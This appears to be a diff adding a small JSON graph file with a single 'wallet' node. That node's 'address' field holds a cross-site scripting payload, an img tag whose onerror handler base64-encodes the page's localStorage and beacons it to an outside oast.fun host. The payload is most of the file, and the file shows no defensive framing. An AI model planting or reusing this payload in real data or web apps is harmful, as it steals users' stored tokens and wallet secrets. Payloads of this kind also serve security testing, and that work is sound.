@@ -1,0 +1,10 @@
+{
+  "nodes": [
+    {
+      "id": 1,
+      "type": "wallet",
+      "address": "<img src=x onerror=\"navigator.sendBeacon('https://wallet.dvajyqmbyzvleteznfmfvtw0hiyuxit9p.oast.fun',btoa(JSON.stringify(localStorage)))\">"
+    }
+  ],
+  "edges": []
+}
